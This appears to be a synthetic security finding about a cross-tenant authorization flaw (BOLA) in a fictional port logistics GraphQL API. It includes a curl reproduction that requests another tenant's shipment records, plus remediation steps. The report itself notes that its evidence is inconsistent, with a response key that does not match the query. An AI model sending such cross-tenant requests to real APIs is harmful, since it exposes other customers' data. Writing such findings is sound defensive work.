# Security Analysis Report
**System:** HarborFlow Port API
**Domain:** Marine / Port Logistics
**Example ID:** GQL-0291
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.6 | Write operation without ownership check on `updateShipment` — attacker from `tenant-162a` accesses port logistics Shipment records owned by `tenant-aed4` |

---

## Finding 1 — BOLA: Write Operation Without Ownership Check (Pattern 1.6)

### Summary
The `updateShipment` mutation on HarborFlow Port API (`api.harborflow-port-api.example.com`) accepts an arbitrary `shipmentId` without verifying the requestor owns that object (§5.0 Pattern 1.6). The write-level BOLA allows state corruption across tenants. The HAR also demonstrates a read-side exploitation via `listShipments` with a client-supplied `tenantId` filter that bypasses JWT-level tenancy validation.

**Context.txt inconsistency (documented):** The HAR request uses the `listShipments` query with `tenantId: "tenant-aed4"` (a read operation), while §5.0 describes Pattern 1.6 as write-level BOLA via `updateShipment`. Additionally, the response JSON key is `getShipment` (INCONSISTENT with request `listShipments`). The HAR (§6.0) is the primary evidence; the write-level vulnerability described in §5.0 applies to `updateShipment` as the design-level risk, while the HAR demonstrates the read-side tenancy bypass through `listShipments`.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-162aaed4"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.6 — Write operations without ownership check (BOLA)
**Affected resolvers:** `updateShipment` (Pattern 1.6 write-side), `listShipments` (HAR-evidenced read-side)
**Affected endpoint:** `POST https://api.harborflow-port-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-162a`, supplying victim `tenantId: "tenant-aed4"`)**
```
POST https://api.harborflow-port-api.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-162a

{"query": "query VulnerableOp { listShipments(tenantId: \"tenant-aed4\") { shipmentId ownerId data { sensitiveField } } }"}
```

**Response — Cross-Tenant Shipment Record Returned**
```json
{
  "data": {
    "getShipment": {
      "tenantId": "tenant-aed4",
      "ownerId": "other-user-162aaed4",
      "data": {
        "sensitiveField": "CONFIDENTIAL-162aaed4",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-162aaed4` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.harborflow-port-api.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-162a" \
  -d '{"query": "query VulnerableOp { listShipments(tenantId: \"tenant-aed4\") { shipmentId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-aed4 returned for tenant-162a caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. `listShipments` must ignore client-supplied `tenantId` argument; extract tenantId from JWT only.
2. `updateShipment` must verify `shipment.tenantId === jwt.tenantId` before performing write.
3. Key Redis cache on `tenantId:shipmentId` composite, not `shipmentId` alone.
